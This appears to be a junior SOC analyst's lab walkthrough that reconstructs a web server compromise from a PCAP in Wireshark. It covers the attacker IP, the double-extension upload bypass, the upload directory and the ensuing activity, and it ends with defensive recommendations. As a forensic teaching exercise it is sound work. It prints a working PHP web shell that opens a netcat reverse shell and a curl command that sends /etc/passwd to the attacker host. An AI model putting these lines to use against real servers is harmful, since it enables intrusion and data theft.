Web Server Compromise & Web Shell Forensic Analysis

Category: Network Forensics | Web Exploitation | SOC Investigation
Artifact: PCAP File
Tools Used: Wireshark
Skill Level: SOC Analyst (Junior)

ğŸ“Œ Overview

This lab focuses on the forensic investigation of a web server compromise captured in a PCAP file.
The incident involves the unauthorized upload of a malicious web shell, followed by remote command execution and an attempted data exfiltration.

The purpose of this investigation is to reconstruct the attackerâ€™s actions by analyzing network traffic and identifying:

Initial access attempts

Exploited weaknesses in file upload validation

Reverse shell activity

Data exfiltration attempts

This walkthrough demonstrates how network forensics supports incident response and highlights common attacker techniques used against vulnerable web applications.

ğŸ¯ Investigation Objectives

Identify the attackerâ€™s geographic origin

Extract attacker metadata (User-Agent)

Determine how upload validation was bypassed

Identify reverse shell communication details

Detect data exfiltration attempts

Understand attacker intent and impact

ğŸ›  Tools Used

Wireshark

IP Geolocation (external enrichment)

HTTP & TCP stream analysis

ğŸ” Analysis & Findings
Q1: Attacker Geographical Origin

Why it matters:
Geolocation assists with threat intelligence, anomaly detection, and geo-blocking strategies.

Methodology:

Open PCAP in Wireshark

Navigate to Statistics â†’ Endpoints â†’ IPv4

Identify the external source IP communicating with the server

Key IP Identified:

Attacker IP: 117.11.88.124

Victim Server: 24.49.63.79

Using IP geolocation services, the attacker IP resolves to:

ğŸ“ Tianjin, China

Conclusion:
The attack originated from Tianjin, China, providing useful context for threat profiling and defensive controls.

Q2: Attacker User-Agent

Why it matters:
User-Agent strings help identify attacker tooling and support detection rules.

Methodology:

Follow the HTTP stream between attacker and server

Inspect request headers

Finding:

Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0


Insight:
The attacker is likely spoofing a legitimate Linux Firefox browser to blend in with normal traffic.

Q3: Malicious Web Shell Uploaded

Why it matters:
Web shells provide persistent access and command execution capabilities.

Methodology:

Apply filter:

ip.src == 117.11.88.124 && http.request.method == "POST"


Observed Activity:

Initial upload attempt:

Filename: image.php

Result: Rejected (Invalid file format)

Second upload attempt:

Filename: image.jpg.php

Result: Successful

Finding:
The malicious web shell uploaded was named:

ğŸ“‚ image.jpg.php

Insight:
The attacker bypassed file validation by double-extension abuse, exploiting improper server-side checks.

Q4: Upload Directory Used by the Web Application

Why it matters:
Identifying storage paths is critical for containment and cleanup.

Methodology:

Follow HTTP responses after upload

Observe redirect behavior

Finding:

Files uploaded via /reviews/upload.php

Stored in:

/reviews/uploads/


Conclusion:
The compromised directory used to store uploaded files is:

ğŸ“ /reviews/uploads/

Q5: Reverse Shell Communication Port

Why it matters:
Identifying attacker listening ports helps with firewall rules and threat hunting.

Extracted Web Shell Code:

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>


Finding:

Reverse shell target port: 8080

Conclusion:
The web shell attempted to establish outbound communication to the attacker on port 8080.

Q6: Targeted File for Exfiltration

Why it matters:
Understanding what data was targeted helps assess breach severity.

Methodology:

Filter traffic:

(tcp.port == 8080) && (ip.src == 24.49.63.79)


Follow TCP stream of reverse shell session

Observed Command:

curl -X POST -d /etc/passwd http://117.11.88.124:443/


Finding:
The attacker attempted to exfiltrate:

ğŸ“„ /etc/passwd

Impact:
Although it does not contain password hashes, /etc/passwd enables user enumeration and supports privilege escalation.

ğŸ§  Key Takeaways (SOC Perspective)

Improper file validation enables web shell deployment

Double-extension attacks are still highly effective

Reverse shells commonly use high ports (e.g., 8080)

Attackers often target /etc/passwd for reconnaissance

PCAP analysis can fully reconstruct attacker activity

ğŸ›¡ Defensive Recommendations

Enforce strict server-side file validation

Disable executable permissions in upload directories

Monitor outbound connections from web servers

Alert on suspicious HTTP POST uploads

Inspect User-Agent anomalies

ğŸ“š Skills Demonstrated

PCAP analysis with Wireshark

HTTP & TCP stream reconstruction

Web attack detection

Reverse shell identification

Incident doc
